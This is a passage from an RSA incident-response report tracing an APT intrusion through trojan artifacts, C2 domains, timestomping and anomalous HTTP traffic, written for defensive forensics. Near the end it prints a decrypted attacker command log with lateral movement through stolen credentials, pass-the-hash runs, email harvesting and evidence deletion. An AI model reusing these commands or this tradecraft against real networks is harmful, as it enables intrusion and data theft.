of\nTrojan.Hikit. \r  \r The \r Yara \r rule \r had \r already \r marked \r the \r file \r as \r malicious \r (i.e. \r blacklisted \r it).\n\n**Figure \r 9: \r Yara \r hit \r on \r Trojan.Hikit**\n\nWhen \r the \r analyst \r triaged \r XXDEV3, \r two \r Trojan.Hikit \r configuration \r files \r were \r found. \r  \r Furthermore, \r while \r this \r example\nof \r Trojan.Hitkit \r appeared \r to \r have \r been \r on \r the \r system \r since \r 2012, \r the \r two \r configuration \r files \r were \r created \r in \r 2013, \r as\nshown \r below:\n\n**Figure \r 10: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.Hikit**\n\nBoth \r configuration \r files \r were \r obfuscated \r with \r a \r 4-­‐byte \r XOR \r key \r similar \r to \r the \r example \r from \r XX13. \r  \r The \r same \r C2 \r node\nwas \r found \r in \r both \r configuration \r files: \r drometic.suroot.com \r (200.108.192.31). \r  \r The \r analyst \r also \r found \r three \r “at” \r job\nfiles \r that \r fortunately \r weren’t \r deleted \r after \r execution, \r as \r shown \r below:\n\n**Figure \r 11: \r ECAT \r MFT \r analysis \r -­‐ \r At#.job \r files**\n\nAt \r this \r point \r the \r analyst \r had \r three \r relevant \r timestamps \r to \r perform \r time \r analysis \r on. \r  \r After \r sorting \r all \r the \r entries \r in\nthe \r MFT \r based \r on \r the \r $FN \r timestamp, \r the \r analyst \r discovered \r the \r following \r relevant \r activity:\n\n1. A \r few \r seconds \r after \r file \r netddesrv.exe \r was \r created \r on \r the \r system \r a \r job \r was \r scheduled \r (At1.job). \r  \r This \r job \r file\n\nexecuted \r a \r file \r named **log.bat,** which \r was \r no \r longer \r present \r on \r the \r system, \r which \r executed[5] \r netddesrv.exe \r in\nreturn. \r  \r This \r proved \r to \r be \r a \r classic \r example \r of \r lateral \r movement.\n\n5\nThis \r assumption \r is \r probably \r true \r because \r throughout \r this \r case \r we \r saw \r the \r adversary \r execute \r files \r via \r batch \r files \r such \r as \r in \r this \r instance.\n\n\n**Figure \r 11: \r ECAT \r MFT \r analysis \r -­‐ \r At#.job \r files**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 13\n\n**Figure \r 12: \r ECAT \r MFT \r time \r analysis**\n\n2. Looking \r at \r the \r next \r scheduled \r job \r the \r analyst \r discovered \r artifacts \r that \r were \r different \r from \r what \r had \r been\n\nencountered \r up \r to \r that \r point, \r namely \r two \r new \r files \r appeared \r after \r a \r scheduled \r job \r was \r executed.\n\n**Figure \r 13: \r ECAT \r MFT \r analysis \r -­‐ \r Trojan.FF-­‐RAT**\n\nThe \r scheduled \r job \r At2.job \r executed \r  \r c:\\set.exe \r (no \r longer \r present \r on \r the \r system), \r which \r dropped \r files \r frtest.dat\nand \r Windows \r Config.wav[6]. \r  \r The \r last \r two \r files \r were \r components \r of \r what \r RSA \r IR \r refers \r to \r as \r Trojan.FF-­‐RAT. \r  \r It\nwas \r unclear \r at \r that \r point \r whether \r this \r Trojan \r was \r from \r a \r different \r APT \r group \r or \r if \r the \r same \r APT \r group \r that\nentrenched \r itself \r in \r this \r system \r in \r August \r 2012, \r decided \r to \r drop \r a \r second \r type \r of \r Trojan \r in \r this \r system. \r  \r Another\ninteresting \r finding \r about \r Trojan.FF-­‐RAT \r was \r that \r file \r frtest.dat \r was \r legitimately \r digitally \r signed \r (as \r of \r the \r time \r of\nthe \r engagement):\n\n**Figure \r 14: \r Digital \r Signature \r details \r of \r Trojan.FF-­‐RAT**\n\nDigitally \r signed \r malware \r is \r rare, \r and \r implies \r a \r higher \r level \r of \r sophistication \r from \r an \r adversary. \r  \r The \r file \r Windows\n**Config.wav \r file \r was \r compressed \r and \r contained \r the \r Trojan’s \r configuration \r information, \r including \r the \r C2 \r domain**\nand \r its \r project \r name. \r  \r Malware \r analysis \r showed \r that \r the \r configuration \r file \r of \r this \r Trojan \r contained \r two \r C2\ndomain \r names, \r which \r both \r resolved \r to \r the \r same \r IP \r at \r that \r time: **mno80.dwy.cc** and **mno995.dwy.cc**\n(198.55.120.222).\n\n6\nNotice \r the \r “00” \r on \r the \r seconds \r for \r the \r creation \r time. \r  \r If \r the \r At2.job \r had \r not \r existed \r or \r the \r SchedLgU.txt \r file \r does \r not \r contain \r any \r evidence \r of \r scheduled \r “at” \r jobs,\nyou \r could \r infer \r that \r the \r Trojan \r was \r dropped \r via \r lateral \r movement, \r by \r looking \r the \r “00” \r seconds \r in \r the \r creation \r time \r of \r the \r malicious \r file(s).\n\n\n-----\n\nRSA \r Incident \r Response Page \r 14\n\nRSA \r created \r a \r YARA \r signature \r for \r this \r new \r Trojan \r based \r on \r a \r unique \r decompression \r algorithm \r that \r the \r Trojan\nutilized:\n\n**Figure \r 15: \r Yara \r signature \r for \r Trojan.FF-­‐RAT**\n\n3. The \r third \r job \r file \r “At3.job” \r also \r executed \r a \r file \r named \r log.bat \r (no \r longer \r present \r on \r the \r system), \r however \r there\n\nis \r nothing \r else \r relevant \r around \r this \r time:\n\n**Figure \r 16: \r ECAT \r MFT \r time \r analysis \r on \r At3.job \r file**\n\nSince \r ECAT \r was \r only \r deployed \r to \r eight \r systems \r at \r this \r point, \r Security \r Analytics \r complimented \r this \r gap \r in \r endpoint\nvisibility \r by \r providing \r network \r visibility. \r  \r A \r quick \r lookup \r of \r IP \r address \r 198.55.120.222 \r shows \r that \r 14 \r internal \r systems\nare \r beaconing \r out \r to \r that \r IP \r address, \r and \r there \r are \r several \r other \r domain \r names \r also \r involved:\n\n**Figure \r 17: \r SA \r analysis \r -­‐ \r Trojan.FF-­‐RAT \r beaconing**\n\nAfter \r presenting \r these \r findings \r to \r CompanyA, \r ECAT \r agents \r were \r deployed \r to \r every \r Windows \r system \r on \r the \r network.\nThis \r is \r where \r ECAT \r also \r compliments \r SA; \r several \r of \r the \r discovered \r Trojans \r were \r set \r to \r sleep \r longer \r than \r others, \r were\nnot \r actively \r running, \r or \r the \r system \r was \r previously \r infected \r with \r Trojan.FF-­‐RAT \r however \r the \r Trojan \r executable \r files\nhad \r since \r been \r removed.\n\nECAT \r uses \r frequency \r analysis \r to \r give \r the \r analyst \r instant \r visibility \r across \r the \r environment \r on \r any \r given \r file. \r  \r In \r this\ncase \r of \r the \r Yara \r signature \r for \r Trojan.FF-­‐RAT, \r ECAT \r informed \r the \r analyst \r that \r file \r frtest.dat \r (by \r MD5 \r hash) \r also \r existed\non \r 5 \r additional \r systems. \r  \r ECAT \r also \r informed \r the \r analyst \r how \r this \r file \r was \r loaded/entrenched, \r namely \r via \r a \r service\nname \r Nwsapagent.\n\n\n**Figure \r 17: \r SA \r analysis \r -­‐ \r Trojan.FF-­‐RAT \r beaconing**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 15\n\n**Figure \r 18: \r ECAT \r analysis \r -­‐ \r Trojan.FF-­‐RAT**\n\nThe \r 5 \r systems \r in \r question \r are \r shown \r below:\n\n**Figure \r 19: \r ECAT \r analysis \r -­‐ \r filtering \r infected \r hosts**\n\n**4.2.3** **ECAT \r Analysis \r – \r Trojan.FF-­‐RAT**\n\nThe \r analyst \r knew \r that \r Trojan.FF-­‐RAT \r consisted \r of \r at \r least \r a \r DLL \r file \r (with \r a \r .dat \r extension) \r and \r a \r configuration \r file\nunder: \r C:\\Windows\\Media\\Windows \r Config.wav, \r and \r the \r hash \r values \r of \r the \r DLLs \r and \r the \r configuration \r files \r varied\nfrom \r system \r to \r system. \r  \r Since \r the \r configuration \r file \r (Windows \r Config.wav) \r was \r a \r unique \r filename \r that \r does \r not \r exist\non \r a \r Windows \r system \r by \r default, \r and \r was \r always \r found \r in \r the \r same \r directory, \r the \r analyst \r used \r this \r fact \r to \r query \r all\nsystems \r for \r evidence \r of \r Trojan.FF-­‐RAT. \r  \r This \r request \r would \r show \r all \r systems \r that \r were \r or \r had \r been \r infected \r with\nTrojan.FF-­‐RAT, \r as \r well \r as \r account \r for \r systems \r where \r the \r Trojan \r was \r present \r on \r the \r system \r but \r not \r actively \r running.\nECAT \r makes \r this \r request \r very \r easy:\n\n**Figure \r 20: \r ECAT \r analysis \r -­‐ \r requesting \r files \r enterprise \r wide**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 16\n\nWithin \r a \r few \r seconds \r ECAT \r gave \r the \r analyst \r a \r list \r of \r systems \r that \r contained \r file \r C:\\Windows\\Media\\Windows\n**Config.wav** **[7], \r which \r had \r been \r infected \r with \r Trojan.FF-­‐RAT. \r  \r A \r total \r of \r 31 \r systems \r contained \r a \r Trojan.FF-­‐RAT**\nconfiguration \r file, \r as \r shown \r below \r (some \r system \r names \r have \r been \r blurred \r to \r protect \r the \r name \r of \r the \r victim).\n\n**Figure \r 21: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.FF-­‐RAT**\n\n**4.2.4** **ECAT \r Analysis \r – \r System \r XXXXNAPP02**\n\nThe \r analyst \r triaged \r system \r XXXXAPP02 \r next, \r and \r focused \r on \r the \r C:\\Windows\\system32\\ \r folder \r where \r frtest.dat\n(Trojan.FF-­‐RAT) \r was \r located. \r  \r The \r analyst \r noticed \r several \r additional \r suspicious \r files \r in \r this \r folder, \r which \r were\nconsidered \r suspicious \r for \r the \r following \r reasons:\n\n**Figure \r 22: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Time \r stomping**\n\n7\nA \r detailed \r technical \r description \r of \r how \r these \r configuration \r files \r were \r obfuscated \r can \r be \r found \r on \r Appendix \r I.\n\n\n**Figure \r 21: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.FF-­‐RAT**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 17\n\n1. File \r frtest.dat \r was \r already \r known \r to \r be \r malicious.\n\n2. Files **fmnonull.dat \r (Trojan.FF-­‐RAT) \r and** **Mstcpnqe.dat \r (Trojan.Derusbi) \r looked \r suspicious \r for \r the \r following**\n\nreasons:\n\na. There \r are \r only \r a \r handful \r of \r .dat \r files \r in \r the \r system32 \r folder \r by \r default, \r and \r their \r timestamps \r including\nthe \r $FN \r are \r much \r older \r (i.e. \r during \r the \r OS \r installation \r time). \r  \r These \r two \r files \r were \r time \r stomped \r to\nlook \r older \r (compare \r $FN \r Creation \r time \r vs \r $SI \r Creation \r time) \r but \r in \r fact \r were \r created \r on \r 25 \r June \r and \r 26\nJune \r 2013 \r respectively.\nb. Both \r files \r were \r created \r (looking \r at \r $FN \r timestamp) \r very \r early \r in \r the \r morning \r (a \r substantial \r amount \r of\n\nmalicious \r activity \r in \r this \r case \r occurred \r between \r 12:00AM \r and \r 6:00AM \r EST).\n\n3. File **ntmrsvc.dll \r (Trojan.Lurker2) \r may \r look \r like \r a \r legitimate \r filename \r (in \r fact \r it \r is \r only \r one \r character \r different**\n\nfrom \r the \r legitimate \r filename \r ntmssvc.dll). \r  \r The \r most \r suspicious \r aspect \r of \r this \r file \r was \r that \r it \r was \r created\nrecently \r with \r no \r other \r activity \r around \r it \r in \r the \r system32 \r folder. \r  \r When \r looking \r at \r all \r the \r files \r in \r the \r system \r and\nsorting \r by \r $FN, \r another \r suspicious \r file \r in \r the \r C:\\Windows\\Temp \r folder \r was \r identified.\n\n**Figure \r 23: \r ECAT \r analysis \r -­‐ \r Trojan.Lurker2**\n\n4. Files \r seclogon.nls, \r senseron.dll, and \r seclogon.nt \r are \r suspicious \r for \r the \r following \r reasons:\n\na. Time \r stomped.\nb. Created \r during \r the \r early \r hours \r in \r the \r morning.\n\nOn \r this \r system \r the \r analyst \r discovered \r two \r new \r Trojan \r families \r Trojan.Derusbi \r and \r Trojan.Lurker2. \r  \r The \r analyst\ncreated \r Yara \r signatures \r for \r each \r of \r them.\n\n**Figure \r 24: \r Yara \r Signature \r -­‐ \r Trojan.Lurker2**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 18\n\n**Figure \r 25: \r Yara \r signature \r -­‐ \r Trojan.DerusbiAP32**\n\n**4.2.5** **ECAT \r Analysis \r – \r Recycler \r folder**\n\nAt \r this \r stage \r of \r the \r investigation \r the \r analyst \r had \r discovered \r four \r different \r Trojan \r families \r and \r several \r infected \r hosts.\nVery \r often \r APT \r adversaries \r are \r not \r careful \r enough \r to \r cleanup \r after \r themselves, \r and \r relevant \r artifacts \r can \r be \r found\nby \r exploiting \r the \r tendencies \r of \r the \r adversary. \r  \r For \r example, \r when \r RSA \r performed \r memory \r analysis \r on \r the \r early\nstages \r of \r this \r case, \r it \r discovered \r (via \r ShimCache \r analysis) \r that \r the \r adversary \r had \r a \r preference \r for \r storing \r relevant\nfiles \r under \r C:\\Recycler\\ \r and \r C:\\Windows\\addins\\.\n\nSince \r certain \r directories \r do \r not \r typically \r contain \r certain \r types \r of \r files, \r the \r analyst \r used \r ECAT \r to \r query \r these\ndirectories \r for \r files \r that \r are \r out \r of \r place. \r For \r example, \r the \r root \r of \r the \r Recycler \r folder \r should \r not \r contain \r any \r files \r at\nall, \r so \r the \r analyst \r requested \r that \r ECAT \r download \r C:\\Recycler\\*.*. Here \r are \r the \r files \r that \r were \r retrieved \r from \r the\nC:\\Recycler\\ \r directory \r from \r various \r systems:\n\n**Figure \r 26: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder**\n\n**4.2.6** **ECAT \r Analysis \r – \r System \r XXME**\n\nThe \r triage \r process \r of \r system \r named \r XXME \r led \r to \r the \r discovery \r of \r some \r interesting \r artifacts. \r  \r The \r first \r relevant \r fact\nwas \r that \r file \r C:\\Recycler\\net.txt \r was \r created \r in \r 2010. \r  \r This \r event \r confirms \r initial \r suspicions \r from \r the \r earliest \r stages\nof \r this \r case, \r that \r the \r earliest \r evidence \r of \r unauthorized \r activity \r goes \r back \r to \r 2010:\n\n\n**Figure \r 26: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 19\n\n**Figure \r 27: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder**\n\nTime \r analysis \r did \r not \r show \r anything \r else \r relevant \r from \r 2010. \r  \r When \r the \r analyst \r performed \r time \r analysis \r around \r the\n**bmp#.tmp \r files \r the \r following \r relevant \r activity \r was \r discovered:**\n\n**Figure \r 28: \r ECAT \r analysis \r -­‐ \r Trojan.Gh0st**\n\nDespite \r the \r unusual \r size \r of \r file \r MSODBC.dll \r at \r about \r 50MB[8], \r this \r file \r along \r with \r file \r mscmos.sys \r were \r found \r to \r be\ncomponents \r of \r Trojan.Gh0st. \r  \r The \r adversary \r artificially \r increased \r the \r size \r of \r file \r MSODBC.dll \r by \r appending \r junk \r data\nto \r the \r end \r of \r it, \r presumably \r to \r avoid \r suspicion. \r  \r A \r quick \r look \r at \r mscmos.sys \r reveals \r that \r it \r was \r an \r obfuscated \r (XOR\nwith \r 0x99) \r configuration \r file \r that \r contained \r domain \r name \r ru.pad62.com, \r and \r the \r victim’s \r company \r name \r appeared\nat \r the \r beginning \r of \r the \r file.\n\nWhen \r looking \r at \r the \r July \r 4[th] \r 2012 \r activity \r the \r analyst \r observed \r another \r interesting \r file:\n\n**Figure \r 29: \r ECAT \r analysis \r -­‐ \r Trojan \r in \r cached \r files**\n\nDue \r to \r the \r time \r proximity \r to \r the \r bmp#.tmp file, \r the \r analyst \r noticed \r that \r an \r executable \r file \r was \r cached \r under \r the\nadministrator.NY \r account. \r  \r This \r file \r was \r also \r found \r to \r be \r highly \r suspicious \r because \r its \r filename \r contained \r the\n\n8\nThe \r size \r of \r a \r typical \r Trojan \r is \r less \r than \r 1MB; \r with \r a \r large \r percentage \r of \r Trojan \r sizes \r falling \r between \r (10KB \r – \r 350KB)\n\n\n-----\n\nRSA \r Incident \r Response Page \r 20\n\ncompany \r name \r in \r it \r (blurred \r for \r this \r reason). \r  \r The \r fact \r that \r this \r file \r is \r cached \r implies \r that \r the \r adversary \r had \r GUI\naccess \r to \r this \r system \r and \r used \r Internet \r Explorer \r to \r download \r this \r file. \r  \r Whenever \r relevant \r cached \r files \r are\ndiscovered \r on \r a \r system, \r the \r analyst \r investigates \r the \r Internet \r History \r of \r that \r user’s \r profile \r to \r determine \r from \r where\nthis \r file \r was \r downloaded. \r  \r Internet \r history \r showed \r that \r the \r malicious \r file \r was \r downloaded \r from:\n**www.haircollalife.com.**\n\n**Figure \r 30: \r Relevant \r Internet \r History \r results**\n\nThe \r file \r in \r question \r also \r appeared \r to \r have \r been \r digitally \r signed; \r however \r this \r certificate \r was \r no \r longer \r valid. \r  \r This\ndownloaded \r file \r was \r found \r to \r be \r a \r dropper \r for \r Trojan.Gh0st. \r  \r When \r executed \r it \r drops \r three \r files: \r 6to4adv.dll,\nBusMgr.sys, \r and \r SvcPack.dat.\n\nDigging \r through \r the \r rest \r of \r the \r Internet \r history, \r another \r suspicious \r file \r was \r downloaded \r on \r 26 \r August \r 2013 \r named\nx8.txt \r from \r http://198.27.112.7:666. \r  \r The \r downloaded \r file \r was \r also \r a \r legitimately \r digitally \r signed \r executable \r file \r (i.e.\nanother \r Trojan.FF-­‐RAT \r variant).\n\n**Figure \r 31: \r Additional \r relevant \r Internet \r History \r results**\n\nEvidence \r found \r in \r this \r system \r shows \r that \r the \r APT \r group \r that \r is \r using \r digitally \r signed \r Trojans \r deployed \r a \r Trojan.Gh0St\nvariant \r (MSODBC.dll) \r in \r May \r 2012. \r  \r It \r then \r deployed \r a \r digitally \r signed \r Trojan.Gh0st \r variant \r in \r July \r 2012. \r  \r Internet\nresearch \r on \r the \r digitally \r signed \r Trojan.Gh0st \r showed \r that \r Sophos \r started \r identifying \r this \r variant \r as \r Troj/PWS-­‐BYU \r on\n17 \r July \r 2012[9]. \r  \r CompanyA \r runs \r Sophos \r AV \r in \r their \r environment, \r so \r the \r signed \r Trojan.Gh0st \r only \r worked \r for \r about \r 13\ndays \r before \r it \r was \r quarantined. \r  \r  \r The \r unsigned \r version \r of \r Trojan.Gh0st \r was \r also \r no \r longer \r active \r because \r malware\nanalysis \r showed \r that \r MSODBC.dll \r attempts \r to \r load \r a \r file \r named \r JET.dll, \r which \r was \r no \r longer \r present \r on \r any \r system.\nSo, \r here \r we \r are \r dealing \r with \r the \r remnants \r of \r a \r Trojan \r that \r is \r no \r longer \r active \r in \r this \r network. \r  \r The \r analyst \r used \r ECAT\nto \r find \r all \r systems \r that \r still \r contained \r Trojan.Gh0st \r artifacts, \r namely \r the \r presence \r of \r file \r svcpack.dat, \r and \r found\nseveral \r such \r systems:\n\n**Figure \r 32: \r ECAT \r analysis \r -­‐ \r Systems \r infected \r with \r Trojan.Gh0st**\n\nFile \r svcpack.dat \r contains \r Trojan \r configuration \r information \r at \r the \r beginning \r of \r the \r file, \r which \r is \r obfuscated \r via \r a\nsingle \r byte \r XOR \r (0x11). \r  \r Here \r is \r an \r example \r of \r a \r de-­‐obfuscated \r configuration \r data \r from \r a \r SvcPack.dat \r file:\n\n9\nhttps://secure2.sophos.com/en-­‐us/threat-­‐center/threat-­‐analyses/viruses-­‐and-­‐spyware/Troj~PWS-­‐BYU/detailed-­‐analysis.aspx\n\n\n-----\n\nRSA \r Incident \r Response Page \r 21\n\n**Figure \r 33: \r Trojan.Gh0st \r -­‐ \r de-­‐obfuscated \r configuration \r file**\n\n**4.2.7** **ECAT \r Analysis \r – \r System \r XX22**\n\nThe \r analyst \r started \r to \r triage \r system \r XX22 \r by \r performing \r time \r analysis \r around \r the \r files \r discovered \r in \r the \r C:\\Recycler\nfolder \r of \r this \r system. \r  \r MFT \r analysis \r also \r revealed \r some \r deleted \r text \r files \r that \r used \r to \r exist \r in \r this \r folder. \r  \r These \r text\nfiles \r were \r recovered \r and \r were \r found \r to \r contain \r recursive \r directory \r listings \r of \r drives \r of \r other \r systems \r in \r the \r network.\nTypically \r APT \r adversaries \r get \r recursive \r directory \r listings \r to \r determine \r which \r filenames \r look \r interesting \r for\nexfiltration.\n\n**Figure \r 34: \r ECAT \r analysis \r -­‐ \r files \r at \r root \r of \r Recycler \r folder**\n\nLooking \r at \r the \r activity \r around \r file \r b.exe \r the \r analyst \r discovered \r that \r it \r was \r responsible \r for \r dropping \r files \r sbiedll.dll\nand \r helper.url \r as \r shown \r below:\n\n**Figure \r 35: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.PlugX**\n\nThese \r three \r malicious \r files \r are \r components \r of \r what \r RSA \r IR \r refers \r to \r as \r Trojan.PlugX. \r  \r While \r looking \r at \r the\nc:\\windows\\system32 \r folder \r the \r analyst \r noticed \r a \r highly \r suspicious \r file \r named \r svchost. \r  \r This \r file \r was \r very \r suspicious\n\n\n-----\n\nRSA \r Incident \r Response Page \r 22\n\nbecause \r it \r contains \r the \r name \r of \r svchost.exe, \r which \r is \r a \r critical \r Windows \r file, \r but \r it \r has \r no \r extension. \r  \r When \r the\nanalyst \r pivoted \r on \r file \r svchost \r the \r following \r relevant \r files \r were \r discovered.\n\n**Figure \r 36: \r ECAT \r MFT \r time \r analysis \r -­‐ \r Trojan.PoisonIvy**\n\nSome \r quick \r malware \r analysis \r on \r dbServer.exe \r revealed \r that \r it \r was \r a \r variant \r of \r Trojan.PoisonIvy \r and \r it \r consisted \r of\nfile \r dbServer.exe, \r which \r de-­‐obfuscated \r and \r loaded \r res.db, \r which \r then \r loaded \r memshare.dat. \r  \r File \r svchost \r is \r the\nkeystroke \r logger \r file \r of \r Trojan.PoisonIvy. \r  \r File \r timebios.dll \r and \r share.dat \r were \r also \r found \r to \r be \r components \r of\nPoisonIvy. \r  \r The \r PoisonIvy \r password \r that \r was \r configured \r in \r these \r samples \r was: \r 15911117665\n\nECAT \r identified \r 6 \r systems \r that \r contain \r file \r timebios.dll:\n\n**Figure \r 37: \r ECAT \r analysis \r -­‐ \r filtering \r systems \r infected \r with \r PoisonIvy**\n\nFour \r of \r these \r six \r systems \r also \r contained \r file \r dbServer.exe:\n\n**Figure \r 38: \r ECAT \r analysis \r -­‐ \r filtering \r systems \r infected \r with \r PoisonIvy**\n\n**4.2.8** **ECAT \r Analysis \r – \r Hunting \r with \r InstantIOCs.**\n\nAnother \r ECAT \r filter \r that \r is \r a \r good \r APT \r malware \r identifier \r is \r the \r “Unsigned_ServiceDLL” \r filter. \r  \r This \r InstantIOC \r filter \r will \r point \r out \r DLL\nfiles \r that \r are \r loaded \r as \r a \r service, \r but \r which \r are \r not \r signed. \r  \r When \r running \r this \r filter \r against \r the \r GlobalModule \r List, \r ECAT \r points \r two\nother \r types \r of \r Trojans \r that \r RSA \r refers \r to \r as \r Trojan.Lurker \r and \r Trojan.Superhardcore.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 23\n\nECAT \r pointed \r out \r four \r DLL \r files \r (tpoaed.dll, \r powms.dll, \r lpest.dll, \r asesed.dll) \r that \r are \r all \r variants \r of \r Trojan.Lurker:\n\n**Figure \r 39: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.Lurker**\n\nAlso, \r ECAT \r pointed \r out \r a \r file \r named \r AppMgmt32.dll, \r which \r is \r also \r an \r unsigned \r DLL \r that \r was \r loaded \r as \r a \r service \r named\nIRMON. \r  \r RSA \r refers \r to \r this \r Trojan \r as \r Trojan.Superhardcore. \r  \r Overall, \r the \r following \r systems \r contained \r Trojan.Superhardcore:\n\n**Figure \r 40: \r ECAT \r analysis \r -­‐ \r systems \r infected \r with \r Trojan.Superhardcorp**\n\n###### 4.3 SA Analysis – Trojan.Lurker\n\nOne \r of \r the \r approaches \r that \r the \r RSA \r IR \r team \r uses \r to \r identify \r malicious \r network \r traffic \r relies \r on \r identifying \r anomalies \r in\nnetwork \r protocols. \r  \r Most \r Trojans \r do \r not \r follow \r protocol \r standards \r and \r thus \r can \r be \r detected \r based \r on \r these\nanomalies. \r  \r For \r example, \r Trojan.Lurker \r is \r a \r classic \r HTTP \r Trojan. \r  \r Detection \r depends \r on \r knowledge \r of \r the \r HTTP \r protocol\nand \r detecting \r anomalies \r and \r non-­‐standard \r traffic. \r  \r In \r this \r case \r the \r Trojan \r stood \r out \r for \r several \r reasons:\n1. First, \r the \r Trojan \r had \r to \r use \r the \r POST \r method \r to \r send \r data \r to \r the \r server. \r  \r There \r is \r no \r RFC \r mandated \r maximum\n\nHTTP \r Header \r size, \r although \r the \r default \r limits \r on \r Apache \r are \r 8KB \r and \r on \r IIS, \r 16KB. \r  \r Trojans \r generally \r attempt \r to\nfollow \r standards \r to \r allow \r the \r requests \r to \r be \r handled \r by \r proxies, \r if \r they \r exist \r in \r the \r environment. \r  \r For \r that \r reason,\nmost \r HTTP \r Trojans \r utilize \r the \r GET \r and \r POST \r method \r to \r facilitate \r a \r command \r shell \r that \r appears \r to \r be \r standard\nHTTP \r traffic. \r  \r The \r POST \r Method \r traffic \r in \r most \r environments \r is \r generally \r 10% \r of \r overall \r HTTP \r traffic, \r making \r it\neasier \r for \r the \r analyst \r to \r find \r malicious \r sessions.\n2. Second, \r the \r Trojan \r uses \r a \r short \r MSIE \r 7 \r User-­‐Agent \r that \r identifies \r itself \r as \r Windows \r XP \r 64 \r bit \r Operating \r System.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 24\n\n3. Third, \r the \r Trojan \r is \r using \r only \r 3 \r HTTP \r headers, \r a \r very \r low \r amount, \r and \r doesn’t \r follow \r best \r practices \r for \r HTTP/1.1;\n\nthe \r Content-­‐Type \r header \r is \r not \r present \r for \r the \r POST \r method.\n\n**Figure \r 41: \r SA \r analysis \r -­‐ \r Trojan.Lurker**\n\nWe \r now \r highlight \r these \r items \r in \r the \r actual \r payload \r of \r the \r traffic:\n\n**Figure \r 42: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r HTTP \r anomalies**\n\nRSA \r discovered \r HTTP \r sessions \r to \r these \r IP’s \r containing \r both \r Windows \r PE’s \r as \r well \r as \r encrypted \r header \r RAR’s. \r  \r The\ncommand \r shell \r was \r encrypted, \r but \r files \r sent \r via \r the \r C2 \r channel \r were \r in \r the \r clear. \r  \r The \r first \r PE \r to \r be \r sent \r was \r rar.exe.\n\n**Figure \r 43: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r channel \r activity**\n\nNext, \r a \r RAR \r archive \r with \r additional \r tools \r was \r sent \r to \r the \r infected \r host.\n\n\n**Figure \r 43: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r channel \r activity**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 25\n\n**Figure \r 44: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r channel \r activity**\n\nA \r batch \r script \r was \r then \r uploaded \r and \r executed \r by \r subsequent \r commands. \r  \r As \r can \r be \r seen \r from \r the \r previous \r to\nexamples \r as \r well, \r this \r Trojan \r download \r files \r in \r plaintext.\n\n**Figure \r 45: \r SA \r analysis \r -­‐ \r Trojan.Lurker \r C2 \r activity**\n\nRSA \r IR \r decrypted \r the \r commands \r from \r the \r Trojan.Lurker \r traffic \r and \r identified \r the \r following \r relevant \r activity:\n```\n   1. RS cmd.exe\n   2. net use \\\\XX16\\ipc$ \"password\" /u:LOCAL\\username\n   3. UL C:\\Windows\\IME\\IMEJP\\ntfre.exe  332800\n   4. UL C:\\Windows\\IME\\IMEJP\\~WRD0208.tmp 134052\n   5. UL C:\\Windows\\IME\\IMEJP\\~WRD0219.tmp 183148\n   6. UL C:\\Windows\\IME\\IMEJP\\p8.bat  291\n   7. ntfre e -p\"&uej2&2^@!Ejd3wUDHFsw21\" ~WRD0219.tmp\n   8. r local\\user1::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXX9F20421885C88B11C388XXXXXX::: \"m\n     -s:172.20.240.21 -u:user1 -t:2013-10-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n   9. r local\\user2::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXXCCA445FCCD44E6BD66D8XXXXXX::: \"m\n     -s:172.20.240.21 -u:user2 -t:2013-09-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n\n```\n\n-----\n\nRSA \r Incident \r Response Page \r 26\n```\n   10. r local\\user3::XXXXXX8F348F93FAD30C70304DXXXXXX:XXXXXX64AB0C641B0FC741B8C2XXXXXX::: \"m\n     -s:172.20.240.21 -u:user3 -t:2013-09-15-00 -o:c:\\windows\\ime\\imejp\\mail\"\n   11. p8.bat\n   12. rd mail /s/q\n   13. del m.exe\n   14. del r.exe\n\n```\nThe \r APT \r operator \r starts \r this \r session \r (1) \r with \r the \r infected \r system \r by \r launching \r a \r remote \r shell \r (RS). \r  \r The \r operator \r then\nestablishes \r a \r network \r connection \r (2) \r using \r stolen \r credentials. \r  \r Several \r files \r are \r then \r uploaded \r (UL) \r to \r the \r infected\nsystem \r (3, \r 4, \r 5, \r 6). \r  \r It \r should \r be \r noted \r that \r ntfre.exe \r is \r the \r RAR \r command \r line \r utility, \r whereas \r the \r .tmp \r files \r are\nactually \r RAR \r archive \r files. \r  \r A \r very \r strong \r RAR \r password \r is \r used \r to \r extract \r (7) \r the \r contents \r of \r ~WRD0219.tmp \r RAR\narchive \r file. \r  \r The \r operator \r then \r runs \r r.exe \r which \r is \r a \r pass-­‐the-­‐hash \r tool \r (8, \r 9, \r 10) \r on \r three \r different \r users, \r and \r also\nexecutes \r m.exe, \r which \r is \r an \r email \r harvesting \r tool. \r  \r The \r email \r harvesting \r tool \r is \r passed \r arguments \r to \r only \r grab \r a \r delta\nof \r emails, \r i.e. \r the \r actors \r already \r have \r taken \r all \r previous \r emails, \r and \r are \r now \r only \r interested \r on \r the \r latest \r emails. \r  \r The\nbatch \r file \r p8.bat \r (11) \r is \r executed. \r  \r This \r file \r contains \r the \r commands \r shown \r on \r Figure \r 46. \r  \r The \r batch \r file \r does \r a \r couple \r of\nthings: \r it \r extracts \r the \r files \r in \r archive \r ~WRD0208.tmp \r using \r 